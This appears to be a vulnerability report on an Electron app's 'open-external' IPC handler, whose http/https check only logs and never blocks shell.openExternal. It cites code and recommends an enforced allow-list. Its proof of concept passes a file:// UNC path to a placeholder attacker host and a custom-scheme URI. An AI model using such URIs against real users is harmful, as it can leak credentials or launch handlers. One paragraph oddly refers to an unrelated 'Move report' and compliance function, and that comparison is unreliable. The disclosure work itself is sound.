## Title
Ineffective protocol check in `open-external` IPC handler allows `shell.openExternal` to be invoked with any attacker-supplied scheme — (File: `app/src/main-process/main.ts`)

## Summary
The `open-external` IPC handler computes a protocol check (`http://`/`https://`) but only uses the result for logging — it never gates the actual privileged action, `shell.openExternal(path)`, which runs unconditionally regardless of the outcome of that check.

## Finding Description
This is the same bug class as the Move report: a security-relevant boolean condition is evaluated, but the code path that should be gated by it executes independently of the condition's result. In `compliance_service::pre_deposit_check_regulated`, the fix required combining the existing OR condition with an additional required check before allowing/blocking the transfer. Here, the analogous invariant is broken in the opposite direction: the guard exists syntactically but is never wired into the control flow that performs the sensitive operation. [1](#0-0) 

```ts
ipcMain.handle('open-external', async (_, path: string) => {
  const pathLowerCase = path.toLowerCase()
  if (
    pathLowerCase.startsWith('http://') ||
    pathLowerCase.startsWith('https://')
  ) {
    log.info(`opening in browser: ${path}`)
  }

  try {
    await shell.openExternal(path)
    return true
  } catch (e) {
    log.error(`Call to openExternal failed: '${e}'`)
    return false
  }
})
```

The `if` block's only effect is a `log.info` call; there is no `else` branch that rejects or sanitizes non-http(s) values, and `shell.openExternal(path)` executes for literally any string passed over IPC, including `file:`, UNC paths (`\\host\share`), or custom registered URI schemes.

This handler backs the renderer-side `openExternal` used throughout `app/src/lib/app-shell.ts` [2](#0-1)  and `dispatcher._openInBrowser`. While some call sites add their own gating (e.g. `SandboxedMarkdown.setupLinkInterceptor` checks `/^https?:/.test(a.protocol)` before invoking `onMarkdownLinkClicked`) [3](#0-2) , many others pass API-derived or repository-derived strings straight through — e.g. `_openInBrowser` [4](#0-3)  — with no scheme validation at all before reaching the IPC handler, which itself performs no enforcement.

## Impact Explanation
`shell.openExternal` handing off attacker-controlled, non-http(s) URIs to the OS is a well known Electron risk: it can trigger registered custom protocol handlers with attacker-supplied arguments (potential RCE depending on installed handlers), or on Windows leak NTLM credentials / trigger SMB-based attacks via UNC-style paths. Because the only check present is decorative (log-only), any code path that forwards an unsanitized string to `shell.openExternal` — including one populated from a GitHub API field (e.g., a compromised/malicious GHES server returning a crafted `clone_url`/`html_url`) or a value embedded in repository content — can bypass what looks like a protocol allow-list but isn't actually enforced.

## Likelihood Explanation
Multiple renderer call sites already assume `https?:` is enforced somewhere ("do not use with non-validated paths" comments exist elsewhere in `app-shell.ts` for other shell APIs), which increases the chance that a caller relies on this handler for safety and forwards weakly-validated data. The strongest gate in the codebase (`sandboxed-markdown.tsx`'s link interceptor) confirms the intended invariant is "only http/https should ever reach `shell.openExternal`" — the main-process handler's check exists for exactly that purpose but does not enforce it, so any caller that skips its own validation reaches an effectively unguarded sink.

## Recommendation
Make the protocol check in the `open-external` handler authoritative: reject (return `false` / throw) and refuse to call `shell.openExternal` when the scheme is not `http:`/`https:` (or an explicit allow-list of additional required schemes), instead of only logging on the positive branch.

## Proof of Concept
1. From the renderer, invoke the exposed IPC bridge with a non-http(s) value, e.g.:
```ts
window.desktop.openExternal('file://\\\\attacker-host\\share\\payload')
// or a registered custom scheme: 'some-installed-app://malicious-args'
```
2. In `main.ts`'s handler, `pathLowerCase.startsWith('http://')` and `startsWith('https://')` are both false, so the `if` block is skipped — but this has no bearing on execution.
3. `shell.openExternal(path)` still runs, handing the raw string to the OS shell/protocol dispatcher.

Note: I could not fully trace every renderer call site to confirm a completely unguarded, attacker-reachable data source reaching this handler (e.g., which specific GitHub API fields flow into `_openInBrowser` without prior scheme validation) within the scope of this investigation — a full audit of all `openExternal`/`_openInBrowser` callers would be needed to enumerate every reachable injection point.

### Citations

**File:** app/src/main-process/main.ts (L581-597)
```typescript
  ipcMain.handle('open-external', async (_, path: string) => {
    const pathLowerCase = path.toLowerCase()
    if (
      pathLowerCase.startsWith('http://') ||
      pathLowerCase.startsWith('https://')
    ) {
      log.info(`opening in browser: ${path}`)
    }

    try {
      await shell.openExternal(path)
      return true
    } catch (e) {
      log.error(`Call to openExternal failed: '${e}'`)
      return false
    }
  })
```

**File:** app/src/lib/app-shell.ts (L43-53)
```typescript
export const shell: IAppShell = {
  // Since Electron 13, shell.trashItem doesn't work from the renderer process
  // on Windows. Therefore, we must invoke it from the main process. See
  // https://github.com/electron/electron/issues/29598
  moveItemToTrash,
  beep: electronShell.beep,
  openExternal,
  showItemInFolder,
  showFolderContents,
  openPath: electronShell.openPath,
}
```

**File:** app/src/ui/lib/sandboxed-markdown.tsx (L292-305)
```typescript
  private setupLinkInterceptor(doc: Document): void {
    doc.addEventListener('click', ev => {
      if (doc.defaultView && ev.target instanceof doc.defaultView.Element) {
        const a = ev.target.closest('a')
        if (a !== null) {
          ev.preventDefault()

          if (/^https?:/.test(a.protocol)) {
            this.props.onMarkdownLinkClicked?.(a.href)
          }
        }
      }
    })
  }
```

**File:** app/src/lib/stores/app-store.ts (L7595-7597)
```typescript
  public _openInBrowser(url: string): Promise<boolean> {
    return shell.openExternal(url)
  }
```
